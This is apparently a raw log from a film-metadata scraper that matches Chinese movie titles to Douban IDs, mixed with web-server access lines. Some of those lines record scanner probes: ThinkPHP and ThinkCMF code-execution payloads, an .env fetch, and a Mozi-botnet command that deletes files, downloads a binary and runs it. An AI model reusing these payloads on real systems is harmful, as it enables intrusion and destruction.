穿越大吉岭 匹配到多个豆瓣id数据，存入列表2 ['1968438', '2264404']
那家伙的声音 2067450 7.5保存成功[douban]
鼠来宝 匹配到多个豆瓣id数据，存入列表2 ['2139553', '35059060']
不公平剧场版 未匹配到合适id
不公平剧场版 无豆瓣id数据，存入列表
人类之城 2310983 7.3保存成功[douban]
蜘蛛人与神犬 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
噪音 匹配到多个豆瓣id数据，存入列表2 ['1892166', '2229436']
迷雾2007 未匹配到合适id
迷雾2007 无豆瓣id数据，存入列表
无法无天 1798225 6.3保存成功[douban]
功夫拳霸3火云盗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
魔界契约 1482088 5.4保存成功[douban]
图书馆员：寻找所罗门王的宝藏 未匹配到合适id
图书馆员：寻找所罗门王的宝藏 无豆瓣id数据，存入列表
持续惊恐 1483239 7.7保存成功[douban]
向日葵2006 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
爱情失事 未匹配到合适id
爱情失事 无豆瓣id数据，存入列表
有顶天酒店 上 未匹配到合适id
有顶天酒店 上 无豆瓣id数据，存入列表
有顶天酒店 下 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
十诫上 未匹配到合适id
十诫上 无豆瓣id数据，存入列表
十诫下 未匹配到合适id
十诫下 无豆瓣id数据，存入列表
杀人命盘 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
日本沉没 匹配到多个豆瓣id数据，存入列表2 ['1788431', '1869844']
大河 未匹配到合适id
大河 无豆瓣id数据，存入列表
伊甸 未匹配到合适id
伊甸 无豆瓣id数据，存入列表
黑色大丽花 匹配到多个豆瓣id数据，存入列表2 ['1578669', '1944141']
越位 匹配到多个豆瓣id数据，存入列表2 ['1825608', '1997939']
第二指令 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
追击神鹰一号 匹配到多个豆瓣id数据，存入列表2 ['1463257', '2983328']
死亡笔记：最后的名字 未匹配到合适id
死亡笔记：最后的名字 无豆瓣id数据，存入列表
窃听风暴2006 未匹配到合适id
窃听风暴2006 无豆瓣id数据，存入列表
硫磺岛的来信 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
堕落天使 2016 未匹配到合适id
堕落天使 2016 无豆瓣id数据，存入列表
丑女大翻身 匹配到多个豆瓣id数据，存入列表2 ['2037796', '1889299']
雏菊 1433360 8.1保存成功[douban]
小火车 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
鬼伎回忆录 未匹配到合适id
----------地址被限制,稍后重试----------
非礼勿视 未匹配到合适id
----------地址被限制,稍后重试----------
隔山有眼 未匹配到合适id
----------地址被限制,稍后重试----------
启示·阿波卡猎逃 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 273/340] 101.89.19.140 () {36 vars in 566 bytes} [Fri May 29 19:00:31 2020] GET /ReportServer => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 274/341] 27.18.144.3 () {44 vars in 863 bytes} [Fri May 29 19:28:14 2020] GET /video/play/82978/1-7.html => generated 19553 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
本能2 匹配到多个豆瓣id数据，存入列表2 ['1418270', '30257457']
007：大战皇家赌场 1418190 7.6保存成功[douban]
提防老千 1945083 5.9保存成功[douban]
龙虎门 1478926 5.8保存成功[douban]
满城尽带黄金甲 1499008 5.6保存成功[douban]
南国风云 未匹配到合适id
南国风云 无豆瓣id数据，存入列表
大汉风之霸王别姬 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
第601个电话 1890569 4.7保存成功[douban]
茉莉花开 未匹配到合适id
茉莉花开 无豆瓣id数据，存入列表
陆小凤传奇之凤舞九天 2136212 7.5保存成功[douban]
方便面时代 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
一石二鸟Ⅱ 未匹配到合适id
一石二鸟Ⅱ 无豆瓣id数据，存入列表
篮球宝贝 未匹配到合适id
篮球宝贝 无豆瓣id数据，存入列表
太阳花 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
诡丝 1780168 7.1保存成功[douban]
北魏传奇 未匹配到合适id
北魏传奇 无豆瓣id数据，存入列表
黑灵芝 3530968 0保存成功[douban]
痴情浪子 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
一球成名 未匹配到合适id
一球成名 无豆瓣id数据，存入列表
剃头匠 3097352 9.2保存成功[douban]
我们俩 未匹配到合适id
我们俩 无豆瓣id数据，存入列表
谈谈心恋恋爱 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
鲍比/博比 未匹配到合适id
鲍比/博比 无豆瓣id数据，存入列表
决战帝国 未匹配到合适id
决战帝国 无豆瓣id数据，存入列表
中天 匹配到多个豆瓣id数据，存入列表2 ['1950427', '26727974']
我的超人女友 1482075 5.6保存成功[douban]
冲突 未匹配到合适id
冲突 无豆瓣id数据，存入列表
金刚 未匹配到合适id
金刚 无豆瓣id数据，存入列表
空战英豪 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
女巫 俄罗斯版 未匹配到合适id
女巫 俄罗斯版 无豆瓣id数据，存入列表
三分钟先生 未匹配到合适id
三分钟先生 无豆瓣id数据，存入列表
侠盗魅影 1467023 6.7保存成功[douban]
粉红豹 美国版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
关于爱 1396313 7.3保存成功[douban]
无影剑 未匹配到合适id
无影剑 无豆瓣id数据，存入列表
美国战士 未匹配到合适id
美国战士 无豆瓣id数据，存入列表
红粉保镖2005 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
向日葵2005 未匹配到合适id
向日葵2005 无豆瓣id数据，存入列表
一石二鸟1 未匹配到合适id
一石二鸟1 无豆瓣id数据，存入列表
法国间谍 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 275/342] 195.54.160.130 () {34 vars in 556 bytes} [Fri May 29 19:59:40 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
我生命中最美丽的一周 未匹配到合适id
我生命中最美丽的一周 无豆瓣id数据，存入列表
的士飚花 未匹配到合适id
的士飚花 无豆瓣id数据，存入列表
雀圣 匹配到多个豆瓣id数据，存入列表2 ['1444595', '1410822']
世界大战 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
女高怪谈4：声音 未匹配到合适id
女高怪谈4：声音 无豆瓣id数据，存入列表
真相大白 匹配到多个豆瓣id数据，存入列表2 ['1422949', '1578711']
火车事故 1761880 6.5保存成功[douban]
隐藏摄像机 匹配到多个豆瓣id数据，存入列表2 ['1438066', '26418038']
花花公子吉米 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
小鱼 匹配到多个豆瓣id数据，存入列表2 ['2284418', '1309208']
名模新人类 未匹配到合适id
名模新人类 无豆瓣id数据，存入列表
魔窟 匹配到多个豆瓣id数据，存入列表2 ['1309056', '1437109']
哈利波特4：火焰杯 未匹配到合适id
哈利波特4：火焰杯 无豆瓣id数据，存入列表
神秘翼龙岛 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 276/343] 195.54.160.130 () {34 vars in 556 bytes} [Fri May 29 20:10:48 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 277/344] 195.54.160.130 () {36 vars in 653 bytes} [Fri May 29 20:10:52 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
红眼 匹配到多个豆瓣id数据，存入列表2 ['1309051', '1419966']
甲贺忍法帖 匹配到多个豆瓣id数据，存入列表2 ['1870117', '1427947']
活死人之地 未匹配到合适id
活死人之地 无豆瓣id数据，存入列表
绝密飞行 1309200 6.7保存成功[douban]
罪恶之城 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
恶魔的艺术2：邪降 1866462 7.5保存成功[douban]
死水 匹配到多个豆瓣id数据，存入列表2 ['1459102', '2174489']
诅咒 匹配到多个豆瓣id数据，存入列表2 ['1308984', '1459323']
灭顶之灾 下 未匹配到合适id
灭顶之灾 下 无豆瓣id数据，存入列表
灭顶之灾 上 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
鸳鸯蝴蝶 未匹配到合适id
鸳鸯蝴蝶 无豆瓣id数据，存入列表
龙咁威2之皇母娘子军呢？ 未匹配到合适id
龙咁威2之皇母娘子军呢？ 无豆瓣id数据，存入列表
长恨歌 1422889 6.0保存成功[douban]
情癫大圣 1439890 5.4保存成功[douban]
大汉风之运筹帷幄 未匹配到合适id
大汉风之运筹帷幄 无豆瓣id数据，存入列表
幸福终点站 未匹配到合适id
幸福终点站 无豆瓣id数据，存入列表
吸血莱恩 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
阿嫂 1410695 5.3保存成功[douban]
变相怪杰2：面具之子 1309193 6.0保存成功[douban]
后备甜心 未匹配到合适id
----------地址被限制,稍后重试----------
绝对隐私之别提过去，别问将来 未匹配到合适id
----------地址被限制,稍后重试----------
娶错老公上对床 未匹配到合适id
----------地址被限制,稍后重试----------
终极游戏 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 278/345] 195.54.160.130 () {34 vars in 716 bytes} [Fri May 29 20:30:35 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
格林兄弟 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 279/346] 27.18.144.3 () {44 vars in 863 bytes} [Fri May 29 21:02:17 2020] GET /video/play/82978/1-8.html => generated 19553 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
青春爱人事件 1438851 6.4保存成功[douban]
日正当中的星空 1790755 6.3保存成功[douban]
三个人的蜜月 3115177 4.0保存成功[douban]
我心飞翔 匹配到多个豆瓣id数据，存入列表2 ['1432016', '5352865']
狩猎者 1830194 6.9保存成功[douban]
桃花灿烂 1466731 7.1保存成功[douban]
山楂树 未匹配到合适id
山楂树 无豆瓣id数据，存入列表
鬼来电2 1309222 6.6保存成功[douban]
恋爱地图 1396313 7.3保存成功[douban]
虫不知 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
见鬼十法 1309217 6.5保存成功[douban]
最好的时光 匹配到多个豆瓣id数据，存入列表2 ['1421809', '1428069']
电影往事 未匹配到合适id
电影往事 无豆瓣id数据，存入列表
早熟 1329962 6.6保存成功[douban]
太行山上2005 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
一个陌生女人的来信 未匹配到合适id
一个陌生女人的来信 无豆瓣id数据，存入列表
青花 1789720 5.3保存成功[douban]
独自等待 未匹配到合适id
独自等待 无豆瓣id数据，存入列表
火线对峙 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
隐面人 未匹配到合适id
隐面人 无豆瓣id数据，存入列表
断背山 1418834 8.8保存成功[douban]
美人依旧 1329938 6.1保存成功[douban]
傲慢与偏见 1418200 8.6保存成功[douban]
蝙蝠侠：侠影之谜 匹配到多个豆瓣id数据，存入列表2 ['1309069', '6828929', '27078012']
胡同里的波西米亚人 1476255 7.6保存成功[douban]
普通朋友 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
欢迎来到东莫村 1433556 8.2保存成功[douban]
勇敢者的游戏2：太空飞行棋 1370276 6.8保存成功[douban]
偷穿高跟鞋 1427319 6.8保存成功[douban]
超人高校 1422913 6.2保存成功[douban]
流浪狗 未匹配到合适id
流浪狗 无豆瓣id数据，存入列表
机械女 1478851 6.3保存成功[douban]
猛鬼追魂07 死亡使者 未匹配到合适id
猛鬼追魂07 死亡使者 无豆瓣id数据，存入列表
猛鬼追魂08 地狱世界 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
牛仔裤的夏天 1309203 7.6保存成功[douban]
艾斯卡达的三次葬礼 1441778 7.8保存成功[douban]
天使A 1443650 7.7保存成功[douban]
男人们的大和 1455771 7.1保存成功[douban]
苏格拉底先生 1461850 7.1保存成功[douban]
美国派4：集体露营 未匹配到合适id
----------地址被限制,稍后重试----------
豺狼计划 1422950 7.3保存成功[douban]
36总局 未匹配到合适id
36总局 无豆瓣id数据，存入列表
遇人不熟 1459148 8.3保存成功[douban]
爱情手册 1939328 7.4保存成功[douban]
心急吃不了热豆腐 1997681 6.9保存成功[douban]
见鬼10法 未匹配到合适id
见鬼10法 无豆瓣id数据，存入列表
最后的绞刑师 1849302 7.8保存成功[douban]
恐怖蜡像馆 1309184 6.9保存成功[douban]
毁灭战士 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 280/347] 162.243.142.126 () {34 vars in 407 bytes} [Fri May 29 21:29:15 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
贝奥武夫与怪兽格兰戴尔 1578465 6.0保存成功[douban]
佐罗传奇 1309042 7.0保存成功[douban]
希望与反抗 1424469 8.0保存成功[douban]
杀戮禁区 1758439 8.2保存成功[douban]
三剑客新传 1941244 6.4保存成功[douban]
康斯坦丁 1309021 7.9保存成功[douban]
地球湮没之惊涛大历险 未匹配到合适id
地球湮没之惊涛大历险 无豆瓣id数据，存入列表
金牌制作人 1479817 7.1保存成功[douban]
空中决战 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
六月日记 1471284 6.8保存成功[douban]
永远的三丁目的夕阳 1463224 8.8保存成功[douban]
求求你，表扬我 1438041 6.9保存成功[douban]
疯狂天使之罪恶冰美人 未匹配到合适id
疯狂天使之罪恶冰美人 无豆瓣id数据，存入列表
不朽的园丁 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
一酷到底 1308989 7.0保存成功[douban]
凤凰劫 未匹配到合适id
凤凰劫 无豆瓣id数据，存入列表
飞虎雄师4之劫金风暴 未匹配到合适id
飞虎雄师4之劫金风暴 无豆瓣id数据，存入列表
图书馆员：寻找命运之矛的探险 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
散打 匹配到多个豆瓣id数据，存入列表2 ['1417441', '4306061']
爱情散打 4306061 0保存成功[douban]
惊天特攻 1309158 6.2保存成功[douban]
狂沙神驹 1308800 7.4保存成功[douban]
水中生活 1308976 7.8保存成功[douban]
异形魔怪4 2016214 5.9保存成功[douban]
女老师VS女学生 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
儿女一箩筐 未匹配到合适id
儿女一箩筐 无豆瓣id数据，存入列表
完美犯罪 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
漫长的婚约 未匹配到合适id
----------地址被限制,稍后重试----------
范海辛 未匹配到合适id
----------地址被限制,稍后重试----------
地狱男爵 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 281/348] 91.234.62.25 () {34 vars in 641 bytes} [Fri May 29 22:11:12 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 282/349] 27.18.144.3 () {44 vars in 863 bytes} [Fri May 29 22:19:31 2020] GET /video/play/82978/1-9.html => generated 19553 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
功夫 1291543 8.6保存成功[douban]
灵 未匹配到合适id
灵 无豆瓣id数据，存入列表
分手专家 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
天崩地裂 上 未匹配到合适id
天崩地裂 上 无豆瓣id数据，存入列表
天崩地裂 下 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
外伤2004 未匹配到合适id
外伤2004 无豆瓣id数据，存入列表
特工行动1 未匹配到合适id
特工行动1 无豆瓣id数据，存入列表
海猿1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
心慌方·零 1316693 7.1保存成功[douban]
萨曼莎：一个美国女孩的假期 1947364 8.1保存成功[douban]
异形大战铁血战士 1308769 6.9保存成功[douban]
希特勒的男孩 1416942 8.2保存成功[douban]
僵尸肖恩 1308755 7.7保存成功[douban]
做头 1309018 5.3保存成功[douban]
2046 未匹配到合适id
----------地址被限制,稍后重试----------
悬剑 5380798 0保存成功[douban]
公主日记2 1308753 6.9保存成功[douban]
歌剧魅影 未匹配到合适id
歌剧魅影 无豆瓣id数据，存入列表
狂蟒之灾2 1308784 6.4保存成功[douban]
调音师-俄罗斯版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
借刀杀人 未匹配到合适id
借刀杀人 无豆瓣id数据，存入列表
活死人黎明 1309088 7.5保存成功[douban]
猫女 1308771 5.8保存成功[douban]
太极旗飘扬 1304972 8.3保存成功[douban]
极速酷客 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
异种3 1422934 5.5保存成功[douban]
电锯惊魂1 未匹配到合适id
电锯惊魂1 无豆瓣id数据，存入列表
恶魔的艺术 1883406 6.3保存成功[douban]
见鬼2 1309125 6.2保存成功[douban]
环游地球八十天 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
谈谈情，跳跳舞 1308828 7.5保存成功[douban]
蜘蛛侠2 未匹配到合适id
----------地址被限制,稍后重试----------
我的电脑会说话 3118172 4.3保存成功[douban]
兄弟 未匹配到合适id
兄弟 无豆瓣id数据，存入列表
九歌 未匹配到合适id
九歌 无豆瓣id数据，存入列表
大佬爱美丽 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
千机变Ⅱ花都大战 1308811 5.4保存成功[douban]
新警察故事 1306160 7.5保存成功[douban]
十面埋伏 1308722 6.2保存成功[douban]
江湖 1308850 7.1保存成功[douban]
天下无贼 1291550 7.9保存成功[douban]
我的法兰西岁月 未匹配到合适id
----------地址被限制,稍后重试----------
龙凤斗 1308838 6.7保存成功[douban]
魔幻厨房 1308742 5.6保存成功[douban]
大事件 1308855 6.7保存成功[douban]
阿孖有难 1477608 5.6保存成功[douban]
新扎师兄 未匹配到合适id
新扎师兄 无豆瓣id数据，存入列表
鬼马狂想曲 1308743 6.1保存成功[douban]
怒火救援 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
柔道龙虎榜 1308796 7.5保存成功[douban]
恋爱大赢家 2080707 6.1保存成功[douban]
冲锋陷阵 1303269 6.2保存成功[douban]
公主复仇记 1329286 6.8保存成功[douban]
蝴蝶效应 1292343 8.8保存成功[douban]
暴力街区2004 未匹配到合适id
暴力街区2004 无豆瓣id数据，存入列表
我爱天上人间 3328336 6.1保存成功[douban]
飞侠小白龙 1388219 5.9保存成功[douban]
爱‧作战 1308862 7.4保存成功[douban]
旺角黑夜 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
卢旺达饭店 1291822 8.9保存成功[douban]
机械公敌 1308843 8.1保存成功[douban]
谍影重重2 1308767 8.7保存成功[douban]
星际传奇2 1308859 6.9保存成功[douban]
美人草 未匹配到合适id
----------地址被限制,稍后重试----------
精装追女仔2004 未匹配到合适id
----------地址被限制,稍后重试----------
自娱自乐 未匹配到合适id
----------地址被限制,稍后重试----------
追击8月15 未匹配到合适id
----------地址被限制,稍后重试----------
香港厨神 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 283/350] 182.254.52.17 () {36 vars in 558 bytes} [Fri May 29 23:26:44 2020] GET /api/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 284/351] 183.192.179.16 () {36 vars in 561 bytes} [Fri May 29 23:34:49 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
时差7小时 未匹配到合适id
----------地址被限制,稍后重试----------
六壮士 未匹配到合适id
----------地址被限制,稍后重试----------
[1590768001] logsize: 86223, triggering log-reopen...
